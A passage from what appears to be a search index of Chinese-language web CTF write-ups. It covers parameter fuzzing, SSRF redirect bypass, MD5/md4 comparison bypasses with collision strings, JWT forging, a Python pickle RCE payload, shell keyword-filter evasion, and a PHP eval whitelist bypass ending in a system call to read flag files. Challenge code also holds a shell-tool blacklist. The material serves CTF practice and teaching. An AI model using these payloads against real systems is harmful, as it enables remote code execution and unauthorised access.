/flag.txt',))\n\n\na = Try()\nprint(urllib.quote(pickle.dumps(a)))\n</code></pre> <p>\u66ff\u6362\u4e3a\u811a\u672c\u751f\u6210\u7684\u5e8f\u5217\u5316\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-8/","title":"Arjun FUZZ \u53c2\u6570","text":""},{"location":"Web/Chapter3/3-8/#arjun-fuzz-\u53c2\u6570","title":"Arjun FUZZ \u53c2\u6570","text":"<p>\u6253\u5f00\u7f51\u9875\u4e0d\u8ba9 F12 \u4ee5\u53ca\u53f3\u952e</p> <p></p> <p>Ctrl + U \u53d1\u73b0\u6709\u4e2a PHP \u6587\u4ef6</p> <p></p> <p>\u8bbf\u95ee\u9875\u9762\u540e\u518d\u6b21\u67e5\u770b\u6e90\u7801\u7ed9\u51fa\u4e86\u63d0\u793a</p> <p></p> <p>\u5b89\u88c5\u5de5\u5177</p> <pre><code>pip install arjun\n</code></pre> <p></p> <p>\u6267\u884c\u547d\u4ee4</p> <pre><code>arjun -u http://challenge.qsnctf.com:31303/c3s4f.php\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u6709\u4e2a <code>shell</code> \u53c2\u6570</p> <p></p> <p>\u4f20\u5165\u53c2\u6570\u7ed9\u51fa\u4e86\u65b0\u63d0\u793a</p> <p></p> <p>\u626b\u63cf\u76ee\u5f55\u53d1\u73b0\u6709\u4e2a <code>secret.php</code></p> <p></p> <p>\u53ea\u5141\u8bb8\u672c\u5730\u8bbf\u95ee</p> <p></p> <p>\u7ed3\u5408\u63d0\u793a\u4ee5\u4e3a\u662f\u8981\u4f2a\u9020 XFF \u6216\u8005 Client-IP\uff0c\u8bd5\u8fc7\u4e86\u90fd\u4e0d\u884c</p> <p>\u5229\u7528 <code>shell</code> \u53c2\u6570\u6784\u9020 SSRF</p> <pre><code>?shell=http://127.0.0.1/secret.php\n</code></pre> <p>\u65e0\u679c</p> <p></p> <p>\u4f7f\u7528\u57df\u540d\u8df3\u8f6c\u7ed5\u8fc7</p> <pre><code>?shell=http://localtest.me/secret.php\n</code></pre> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <pre><code>&lt;?php\nshow_source(__FILE__);\ninclude('k4y.php');\ninclude_once('flag.php');\n\n\n// Challenge 1\nif (isset($_GET['DrKn'])) {\n    $text = $_GET['DrKn'];\n    if(@file_get_contents($text) == $key) {\n        echo \"\u6709\u70b9\u4e1c\u897f\u5462\".\"&lt;/br&gt;\".$key1.\"&lt;/br&gt;\";\n    } else {\n        die(\"\u8c8c\u4f3c\u72b6\u6001\u4e0d\u5728\u7ebf\u554a(\u256f_\u2570)&lt;/br&gt;\");\n    }\n} \n\n\n// Challenge 2\nif (isset($_GET[$key1])) {\n    $damei = $_GET[$key1];\n    if (hash(\"md4\", $damei) == $damei) {\n        echo \"\u53c8\u8fd1\u4e86\u4e00\u6b65\u5462\uff0c\u5b9d~\".\"&lt;/br&gt;\".$key2.\"&lt;/br&gt;\".$key3;\n    } else {\n        die(\"\u8fbe\u54a9\u54df~\");\n    }\n} \n\n\n// Challenge 3\nif (isset($_POST[$key2]) &amp;&amp; isset($_POST[$key3])) {\n    $user = $_POST[$key2];\n    $pass = $_POST[$key3];\n\n    if (strlen($user) &gt; 4 || strlen($pass) &gt; 5) {\n          die(\"\u8fd8\u5f97\u7ec3\");\n      }\n     if ($user !== $pass &amp;&amp; md5($user) === md5($pass)) {  \n          echo \"\u8fd8\u4e0d\u9519\u54e6\".\"$flag\";\n      }\n      else {\n          die(\"nonono\") ;\n      }\n    }\n\n?&gt;\n</code></pre> <p>\u7b2c\u4e00\u5173\u5c31\u662f\u4f20\u5165\u7ed9\u51fa\u7684 Key\uff0c\u4f46\u662f\u9700\u8981\u7528\u5230 <code>data</code> \u4f2a\u534f\u8bae</p> <p></p> <p>\u7b2c\u4e8c\u5173\u662f\u4e00\u4e2a <code>md4</code> \u7684\u5f31\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u5176\u5b9e\u53ef\u4ee5\u901a\u8fc7\u79d1\u5b66\u8ba1\u7b97\u6cd5\u6bd4\u8f83\u7ed5\u8fc7</p> <p>\u4e5f\u5c31\u662f\u8bf4\u8981\u627e\u4e00\u4e2a\u660e\u6587\u662f\u4e00\u4e2a\u79d1\u5b66\u8ba1\u7b97\u6cd5 0e \u5f00\u5934\u7684\uff0c\u7136\u540e\u5176\u52a0\u5bc6\u4e5f\u662f 0e \u5f00\u5934\u540e\u9762\u90fd\u662f\u6570\u5b57</p> <pre><code>&amp;M_ore.8=0e001233333333333334557778889\n</code></pre> <p>\u6700\u540e\u4e00\u5173\u5c31\u662f <code>md5</code> \u5f3a\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u90fd\u4e3a\u6570\u7ec4\u5373\u53ef</p> <p></p>"},{"location":"Web/Chapter3/3-9/","title":"Curl \u4f20\u53c2","text":""},{"location":"Web/Chapter3/3-9/#curl-\u4f20\u53c2","title":"Curl \u4f20\u53c2","text":"<p>\u6253\u5f00\u7f51\u9875\u67e5\u770b\u6e90\u7801\u62ff\u5230\u4e86\u7528\u6237\u540d\u53ca\u5bc6\u7801</p> <p></p> <p>\u63d0\u793a\u4e86\u8ba9\u6211\u4eec\u4f20 POST \u6570\u636e\u8fc7\u53bb\uff0c\u4f7f\u7528\u5de5\u5177 <code>curl</code></p> <pre><code>curl -X POST http://165.227.106.113/post.php -d \"username=admin&amp;password=71urlkufpsdnlkadsf\"\n</code></pre> <p></p>"},{"location":"Web/Chapter4/4-1/","title":"URL \u53c2\u6570\u7834\u89e3","text":""},{"location":"Web/Chapter4/4-1/#url-\u53c2\u6570\u7834\u89e3","title":"URL \u53c2\u6570\u7834\u89e3","text":"<p>\u5148\u6253\u5f00 F12 \u7684\u7f51\u7edc\uff0c\u6e38\u620f\u7ed3\u675f\u65f6\u53d1\u9001\u4e86\u4e00\u4e2a PHP \u6587\u4ef6\u53ca\u51e0\u4e2a URL \u53c2\u6570</p> <p>score \u5c31\u662f\u6211\u4eec\u7684\u6210\u7ee9\uff0cip \u5c31\u662f\u6211\u4eec\u7684 ip\uff0csign \u770b\u6837\u5b50\u5e94\u8be5\u662f\u88ab Base64 \u7f16\u7801\u4e86</p> <p></p> <p>\u89e3\u7801\u5931\u8d25</p> <p></p> <p>\u518d\u6b21\u73a9\u628a\u6e38\u620f\u89c2\u5bdf URL \u53c2\u6570</p> <p></p> <p>\u5728 BurpSuite \u4e2d\u6293\u5305\u4fee\u6539\u53c2\u6570\u8fbe\u5230\u6ee1\u5206</p> <p></p>"},{"location":"Web/Chapter4/4-2/","title":"HTTP \u5b57\u6bb5\u7834\u89e3","text":""},{"location":"Web/Chapter4/4-2/#http-\u5b57\u6bb5\u7834\u89e3","title":"HTTP \u5b57\u6bb5\u7834\u89e3","text":"<p>\u7f51\u9875\u4e0a\u5565\u4e5f\u6ca1\u6709\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\u7ed9\u4e86\u63d0\u793a\uff0c\u8981\u6211\u4eec POST \u4f20\u53c2 margin \u503c</p> <p></p> <p>BurpSuite \u4e2d\u6293\u5305\u53d1\u73b0\u54cd\u5e94\u5305\u4e2d\u6709 flag \u5b57\u6bb5</p> <p></p> <p>\u89e3\u7801\u62ff\u5230\u5047\u7684 flag \u63d0\u4ea4\u4e0d\u6b63\u786e</p> <p></p> <p>\u518d\u6b21\u89e3\u7801\u53d1\u73b0\u8fd8\u80fd\u89e3\u7801</p> <p></p> <p>\u540e\u9762\u91cd\u65b0\u6293\u5305\u53d1\u73b0\u7ed9\u7684 flag \u662f\u4f1a\u53d8\u7684\uff0c\u7ed3\u5408\u9898\u76ee\u540d\u5e94\u8be5\u662f\u8981\u5199\u811a\u672c\u4e86</p> <p>\u601d\u8def\u662f\u5148\u4fdd\u5b58\u4f1a\u8bdd\uff0c\u7136\u540e\u83b7\u53d6 HTTP \u5934\u4e2d\u7684 flag \u5b57\u6bb5\uff0c\u89e3\u7801\u540e\u683c\u5f0f\u5316\u4e00\u4e0b\u518d\u89e3\u7801\uff0c\u6700\u540e POST \u63d0\u4ea4</p> <pre><code>import requests\nimport base64\n\nurl = \"http://114.67.175.224:19660/\"\n\nsession = requests.Session()\n\nmyrequests = session.get(url)\n\nheader_flag = myrequests.headers['flag']\n\n# python3\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u5bfc\u81f4\u751f\u6210 bytes \u5bf9\u8c61\uff0cpython2 \u76f4\u63a5\u53ef\u4ee5\u4f7f\u7528 decodestring\nheader_flag_decode = base64.b64decode(header_flag)\n\n# \u56e0\u4e3a\u4e0a\u4e00\u6b65\u89e3\u7801\u65f6\u751f\u6210\u4e86 bytes \u7c7b\u578b\u5bf9\u8c61\uff0c\u9700\u8981\u8f6c\u5316\u4e3a string\uff0cdecode() \u9ed8\u8ba4\u7f16\u7801\u662f utf-8\nheader_flag_decode = header_flag_decode.decode()\n\n# \u53d6 flag \u5185\u5bb9\uff0c\u4f5c\u4e3a margin \u53c2\u6570\u503c\nmargin_value = header_flag_decode.split(\": \")[1]\n\npage = session.post(url, {\"margin\": base64.b64decode(margin_value)})\n\nprint(page.text)\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter4/4-3/","title":"JWT \u7834\u89e3","text":""},{"location":"Web/Chapter4/4-3/#jwt-\u7834\u89e3","title":"JWT \u7834\u89e3","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u63d0\u793a</p> <p></p> <p>\u7f51\u9875\u592a\u591a\u4e86\uff0c\u7528\u811a\u672c\u53bb\u627e</p> <pre><code>import requests\n\nurl=\"http://30b74212-bc6f-465c-8b60-d9aeaa215b75.node4.buuoj.cn:81/shop?page=\"\n\nfor i in range(0,2000):\n    print(i)\n    r=requests.get( url + str(i) )\n    if 'lv6.png' in r.text:\n        print (i)\n        break\n</code></pre> <p></p> <p>\u627e\u5230\u540e\u8d2d\u4e70\u94b1\u4e0d\u591f\uff0c\u4fee\u6539\u524d\u7aef\u4ee3\u7801\u7684\u6298\u6263</p> <p></p> <p>\u8d2d\u4e70\u540e\u663e\u793a\u53ea\u80fd admin \u8bbf\u95ee</p> <p></p> <p>\u67e5\u770b Cookies \u53d1\u73b0\u6709 JWT</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u7834\u89e3\u5bc6\u94a5</p> <p></p> <p>\u53bb\u5728\u7ebf\u7f51\u7ad9\u751f\u6210 admin \u7684 JWT</p> <p></p> <p>\u66ff\u6362\u6389\u5237\u65b0\u7f51\u9875</p> <p></p> <p>\u70b9\u51fb\u540e\u6ca1\u53cd\u5e94\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\u6709\u538b\u7f29\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u540e\u62ff\u5230\u6e90\u7801</p> <pre><code>import tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n</code></pre> <p>become \u53c2\u6570\u5b58\u5728 Pickle \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <pre><code>import pickle\nimport urllib\nimport commands\n\n# commands.getoutput \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5e76\u8fd4\u56de\u8f93\u51fa\nclass Try(object):\n    def __reduce__(self):\n        return (commands.getoutput, ('cat /flag.txt',))\n\n\na = Try()\nprint(urllib.quote(pickle.dumps(a)))\n</code></pre> <p>\u66ff\u6362\u4e3a\u811a\u672c\u751f\u6210\u7684\u5e8f\u5217\u5316\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter4/4-4/","title":"JavaScript \u53cd\u6df7\u6dc6","text":""},{"location":"Web/Chapter4/4-4/#javascript-\u53cd\u6df7\u6dc6","title":"JavaScript \u53cd\u6df7\u6dc6","text":"<p>\u67e5\u770b\u6e90\u7801\u53d1\u73b0\u505a\u4e86\u6df7\u6dc6</p> <p></p> <p>\u53bb\u6df7\u6dc6\u4e0b\u8f7d\u8fd9\u4e2a <code>./JIFxzHyW8W</code> \u62ff\u5230 flag</p> <pre><code>let exports;\n\n(async () =&gt; {\n  // \u62c9\u53d6\u5e76\u52a0\u8f7d WebAssembly \u6a21\u5757\n  const resp = await fetch('./JIFxzHyW8W');\n  const { instance } = await WebAssembly.instantiate(await resp.arrayBuffer());\n  exports = instance.exports; // \u66b4\u9732\u7684\u5bfc\u51fa\u51fd\u6570\u653e\u5728\u8fd9\u91cc\n})();\n\nfunction onButtonPress() {\n  // \u8bfb\u53d6\u8f93\u5165\u6846\u7684\u5185\u5bb9\n  const s = document.getElementById('input').value;\n\n  // \u628a\u8f93\u5165\u7684\u6bcf\u4e2a\u5b57\u7b26\u9010\u4e2a\u5199\u5165 WASM \u7684\u7f13\u51b2\u533a\n  for (let i = 0; i &lt; s.length; i++) {\n    exports.copy_char(s.charCodeAt(i), i);\n  }\n\n  // \u8ffd\u52a0\u5b57\u7b26\u4e32\u7ec8\u6b62\u7b26\uff080\uff09\uff0c\u4f4d\u7f6e\u662f\u5b57\u7b26\u4e32\u672b\u5c3e\n  exports.copy_char(0, s.length);\n\n  // \u8c03\u7528 WASM \u5185\u7684\u6821\u9a8c\u51fd\u6570\n  const ok = exports.check_flag() == 1;\n\n  // \u663e\u793a\u7ed3\u679c\n  document.getElementById('result').innerHTML = ok ? 'Correct!' : 'Incorrect!';\n}\n</code></pre>"},{"location":"Web/Chapter5/5-1/","title":"\u540e\u53f0\u5bc6\u7801\u7206\u7834","text":""},{"location":"Web/Chapter5/5-1/#\u540e\u53f0\u5bc6\u7801\u7206\u7834","title":"\u540e\u53f0\u5bc6\u7801\u7206\u7834","text":"<p>\u6253\u5f00\u662f\u4e00\u4e2a\u9759\u6001\u7f51\u9875</p> <p></p> <p>\u626b\u63cf\u540e\u53f0\u76ee\u5f55\u627e\u5230\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u8bbf\u95ee\u53d1\u73b0\u53ea\u9700\u8981\u5bc6\u7801</p> <p></p> <p>\u56e0\u4e3a\u6ca1\u6709\u7ed9\u5176\u4ed6\u7ebf\u7d22\uff0c\u6240\u4ee5\u4f7f\u7528 BurpSuite \u7206\u7834\uff0c\u5148\u5f00\u542f\u4ee3\u7406\u62e6\u622a\uff0c\u8f93\u5165 1234 \u540e\u6293\u5305\u53d1\u9001\u5230\u653b\u51fb\u6a21\u5757</p> <p></p> <p>\u7ed9\u8981\u7206\u7834\u7684\u5bc6\u7801\u53c2\u6570\u6dfb\u52a0 $\uff0c\u7c7b\u578b\u9009\u62e9\u72d9\u51fb\u624b</p> <p></p> <p>\u5728\u6709\u6548\u8f7d\u8377\u4e2d\u914d\u7f6e\u5b57\u5178</p> <p></p> <p>\u70b9\u51fb\u53f3\u8fb9\u7684\u5f00\u59cb\u653b\u51fb\uff0c\u7136\u540e\u4f1a\u5f39\u51fa\u8fd9\u4e2a\u653b\u51fb\u6846</p> <p></p> <p>\u9009\u62e9\u957f\u5ea6\u6392\u5217\u627e\u51fa\u4e0d\u4e00\u6837\u7684\u6570\u636e\u5305\uff0c\u770b\u5230\u6709\u4e2a hack \u4e0e\u5176\u4ed6\u7684\u4e0d\u4e00\u6837</p> <p></p> <p>\u8f93\u5165 hack \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter5/5-2/","title":"JWT \u5bc6\u94a5\u7206\u7834","text":""},{"location":"Web/Chapter5/5-2/#jwt-\u5bc6\u94a5\u7206\u7834","title":"JWT \u5bc6\u94a5\u7206\u7834","text":"<p>admin/admin \u767b\u5f55</p> <p></p> <p>\u62e6\u622a\u767b\u5f55\u540e\u7684\u5305\u53d1\u73b0\u6709 JWT \u5728 Cookie \u4e2d</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 jwtcrack \u7834\u89e3</p> <p></p> <p>\u5148\u53bb\u7f51\u7ad9\u89e3\u7801\uff0c\u53ef\u4ee5\u770b\u5230 <code>role</code> \u662f <code>guest</code></p> <p></p> <p>\u6539\u4e3a admin \u518d\u8865\u4e0a\u7206\u7834\u51fa\u7684\u5bc6\u94a5\u7f16\u7801</p> <p></p> <p>\u590d\u5236\u66ff\u6362\u6389\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-1/","title":"assert() RCE","text":""},{"location":"Web/Chapter6/6-1/#assert-rce","title":"assert() RCE","text":"<p>explode() \u51fd\u6570\u4f7f\u7528\u4e00\u4e2a\u5b57\u7b26\u4e32\u5206\u5272\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd4\u56de\u7531\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\u6570\u7ec4</p> <p>\u90a3\u4e48 $poc2 = assert\uff0cassert() \u662f\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u8868\u8fbe\u5f0f\u662f\u5426\u6210\u7acb</p> <p>\u4f46\u662f\u4ed6\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\uff0c\u8fd9\u5c31\u5b58\u5728 RCE</p> <p></p> <p>scandir() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6570\u7ec4\uff0cprint_r() \u51fd\u6570\u7528\u4e8e\u6253\u5370\uff0c\u7ec4\u5408\u8d77\u6765\u5c31\u662f Linux \u4e2d\u7684 ls</p> <p></p> <p>\u76f4\u63a5\u8bbf\u95ee\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-10/","title":"20+\u5173\u952e\u5b57\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-10/#20\u5173\u952e\u5b57\u7ed5\u8fc7","title":"%20+\u5173\u952e\u5b57\u7ed5\u8fc7","text":"<p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0 ajax \u8bf7\u6c42\uff0cURL \u8ddf\u4e0a\u8fd9\u4e2a\u6587\u4ef6\u540d\u53bb\u770b\u770b</p> <p></p> <p>\u62ff\u5230\u4e86\u6e90\u7801\uff0c\u505a\u4e86\u8fc7\u6ee4</p> <p></p> <p>\u6570\u5b57\u53ef\u4ee5\u4f20\u5165</p> <p></p> <p>\u5b57\u7b26\u5219\u4e0d\u884c</p> <p></p> <p>\u67e5\u8be2\u5b57\u7b26\u4e32\u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u67d0\u4e9b\u5b57\u7b26\u5220\u9664\u6216\u7528\u4e0b\u5212\u7ebf\u4ee3\u66ff</p> <p>\u4f8b\u5982\u5c06\u53c2\u6570\u524d\u7684\u7a7a\u683c\u5220\u9664</p> <p>\u4f46\u662f WAF \u4f1a\u56e0\u4e3a\u8fd9\u4e2a\u7a7a\u683c\u5bfc\u81f4\u68c0\u6d4b\u4e0d\u5230 num \u8fd9\u4e2a\u53c2\u6570\uff0c\u6700\u7ec8\u5bfc\u81f4 WAF \u88ab\u7ed5\u8fc7</p> <p></p> <p>\u540e\u9762\u7684\u5e38\u89c4\u64cd\u4f5c\u5bf9\u5b57\u7b26\u90fd\u505a\u4e86\u8fc7\u6ee4\uff0c\u5747\u4f7f\u7528 chr() \u4ee3\u66ff</p> <p></p> <p>\u6709\u4e00\u4e2a f1agg</p> <p></p> <p>\u4f7f\u7528 file_get_contents() \u628a\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u6700\u540e\u8f93\u51fa\u62ff\u5230 flagnpm</p> <p></p>"},{"location":"Web/Chapter6/6-11/","title":"\u5173\u952e\u5b57\u52a0 \\\\ \u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-11/#\u5173\u952e\u5b57\u52a0-\u7ed5\u8fc7","title":"\u5173\u952e\u5b57\u52a0  \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u6709\u4e24\u4e2a URL \u53c2\u6570\uff0c\u5176\u4e2d\u4e00\u4e2a\u662f\u56fe\u7247\u7684</p> <p></p> <p>\u5c06\u53c2\u6570\u4e24\u6b21 Base64 \u89e3\u7801\u540e\u518d Hex \u89e3\u7801\u62ff\u5230\u539f\u56fe\u7247\u540d</p> <p></p> <p>\u5c06\u53c2\u6570\u6362\u6210\u7f16\u7801\u540e\u7684 index.php</p> <p>\u53f3\u952e\u56fe\u7247\u94fe\u63a5\u590d\u5236\u53c2\u6570</p> <p></p> <p>Base64 \u89e3\u7801\u62ff\u5230 flag</p> <pre><code>&lt;?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '&lt;img src =\"./ctf3.jpeg\"&gt;';\n    die(\"xixi\uff5e no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\";\n    echo \"&lt;br&gt;\";\n}\necho $cmd;\necho \"&lt;br&gt;\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"&lt;br&gt;\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?&gt;\n&lt;html&gt;\n&lt;style&gt;\n  body{\n   background:url(./bj.png)  no-repeat center center;\n   background-size:cover;\n   background-attachment:fixed;\n   background-color:#CCCCCC;\n}\n&lt;/style&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u9700\u8981\u7ed5\u8fc7\u5f3a\u6bd4\u8f83</p> <pre><code>(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])\n</code></pre> <p>\u9700\u8981\u627e\u5230\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u7b26\u4f46\u662f\u4ed6\u4eec\u7684 md5 \u503c\u662f\u76f8\u540c\u7684</p> <p>\u6ce8\u610f\u4e00\u70b9\uff0cPOST \u65f6\u4e00\u5b9a\u8981 urlencode\uff01\uff01\uff01</p> <pre><code>#1\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   \nb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   \n#2\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   \nb=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%\n#3\n$a=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";\n$b=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";\n</code></pre> <p>\u5173\u952e\u8bcd\u88ab\u8fc7\u6ee4\u4e86\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u6760  \u7ed5\u8fc7</p> <pre><code>l\\s%20/\nca\\t%20/flag\n.......\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-12/","title":"\u8fdb\u5236\u8f6c\u6362\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-12/#\u8fdb\u5236\u8f6c\u6362\u7ed5\u8fc7","title":"\u8fdb\u5236\u8f6c\u6362\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u62ff\u5230\u6e90\u4ee3\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\n//\u542c\u8bf4\u4f60\u5f88\u559c\u6b22\u6570\u5b66\uff0c\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u7231\u5b83\u80dc\u8fc7\u7231flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //\u4f8b\u5b50 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) &gt;= 80) {\n        die(\"\u592a\u957f\u4e86\u4e0d\u4f1a\u7b97\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u5b57\u7b26\");\n        }\n    }\n    //\u5e38\u7528\u6570\u5b66\u51fd\u6570http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);\n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u51fd\u6570\");\n        }\n    }\n    //\u5e2e\u4f60\u7b97\u51fa\u7b54\u6848\n    eval('echo '.$content.';');\n}\n</code></pre> <p>hex2bin() \u51fd\u6570\u628a\u5341\u516d\u8fdb\u5236\u503c\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a ASCII \u5b57\u7b26</p> <p>base_convert() \u51fd\u6570\u5728\u4efb\u610f\u8fdb\u5236\u4e4b\u95f4\u8f6c\u6362\u6570\u5b57</p> <p>dechex() \u51fd\u6570\u628a\u5341\u8fdb\u5236\u6570\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u6570</p> <pre><code>base_convert(37907361743,10,36) =&gt; \"hex2bin\"\ndechex(1598506324) =&gt; \"5f474554\"\n$pi=hex2bin(\"5f474554\") =&gt; $pi=\"_GET\"   // hex2bin\u5c06\u4e00\u4e3216\u8fdb\u5236\u6570\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\n($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs}  // {} \u53ef\u4ee5\u4ee3\u66ff []\n</code></pre> <pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac flag.php\n</code></pre> 